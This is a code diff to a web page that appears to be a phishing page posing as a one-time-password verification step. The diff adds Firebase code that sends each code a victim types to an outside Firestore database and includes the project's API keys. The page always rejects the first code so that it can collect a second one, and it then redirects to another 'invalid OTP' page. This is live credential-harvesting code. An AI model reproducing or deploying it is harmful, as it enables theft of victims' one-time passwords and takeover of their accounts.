@@ -116,7 +116,6 @@
   </style>
 </head>
 <body>
-
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
   <div class="loading-text" id="loadingText">
@@ -164,16 +163,32 @@
   <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
 </div>
 
-<script>
-  var timerInterval;
-  var totalSeconds = 180;
-  var submitCount = 0;
+<!-- Firebase SDK -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+    authDomain: "sbighsh.firebaseapp.com",
+    projectId: "sbighsh",
+    storageBucket: "sbighsh.firebasestorage.app",
+    messagingSenderId: "685947657107",
+    appId: "1:685947657107:web:471a0557bb72235272a666"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  let timerInterval;
+  let totalSeconds = 180;
+  let submitCount = 0;
 
   function startTimer() {
     clearInterval(timerInterval);
     totalSeconds = 180;
     updateTimerDisplay();
-    timerInterval = setInterval(function() {
+    timerInterval = setInterval(() => {
       totalSeconds--;
       updateTimerDisplay();
       if (totalSeconds <= 0) clearInterval(timerInterval);
@@ -181,8 +196,8 @@
   }
 
   function updateTimerDisplay() {
-    var minutes = Math.floor(totalSeconds / 60);
-    var seconds = totalSeconds % 60;
+    let minutes = Math.floor(totalSeconds / 60);
+    let seconds = totalSeconds % 60;
     document.getElementById('timer').textContent =
       (minutes < 10 ? '0' : '') + minutes + ":" + (seconds < 10 ? '0' : '') + seconds + " seconds";
   }
@@ -192,11 +207,16 @@
     alert('OTP has been resent.');
   }
 
-  function submitForm() {
-    var otpInput = document.getElementById('otpInput');
-    var otpError = document.getElementById('otpError');
-    var otpInvalidError = document.getElementById('otpInvalidError');
-    var otpValue = otpInput.value.trim();
+  function validateOTP() {
+    const input = document.getElementById('otpInput');
+    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
+  }
+
+  async function submitForm() {
+    const otpInput = document.getElementById('otpInput');
+    const otpValue = otpInput.value.trim();
+    const otpError = document.getElementById('otpError');
+    const otpInvalidError = document.getElementById('otpInvalidError');
 
     otpError.style.display = 'none';
     otpInvalidError.style.display = 'none';
@@ -209,41 +229,55 @@
 
     if (submitCount === 0) {
       localStorage.setItem('firstOtp', otpValue);
-      otpInvalidError.style.display = 'block'; // INVALID OTP error shown here
+      otpInvalidError.style.display = 'block';
       otpInput.focus();
       submitCount++;
     } else {
       localStorage.setItem('finalOtp', otpValue);
+      await saveOTPToFirebase(otpValue);
       showLoading();
+    }
+  }
+
+  async function saveOTPToFirebase(otp) {
+    try {
+      await addDoc(collection(db, "otp_verifications"), {
+        otp: otp,
+        timestamp: serverTimestamp()
+      });
+    } catch (e) {
+      console.error("Error saving OTP:", e);
+      alert("Failed to save OTP.");
     }
   }
 
   function showLoading() {
     document.getElementById('overlay').style.display = 'flex';
-    var countdown = 3;
-    var countdownElement = document.getElementById('countdown');
+    let countdown = 3;
+    const countdownElement = document.getElementById('countdown');
     countdownElement.textContent = countdown;
 
-    var interval = setInterval(function() {
+    const interval = setInterval(() => {
       countdown--;
       if (countdown >= 0) {
         countdownElement.textContent = countdown;
       }
       if (countdown < 0) {
         clearInterval(interval);
-        window.location.href = 'green.html';
+        window.location.href = 'invalidotp2.html';
       }
     }, 1000);
   }
 
-  function validateOTP() {
-    var input = document.getElementById('otpInput');
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
-  }
-
-  window.onload = function() {
+  // Start the countdown timer on page load
+  window.addEventListener('DOMContentLoaded', () => {
     startTimer();
-  };
+  });
+
+  // Make functions accessible to inline onclick
+  window.submitForm = submitForm;
+  window.resendOTP = resendOTP;
+  window.validateOTP = validateOTP;
 </script>
 
 </body>
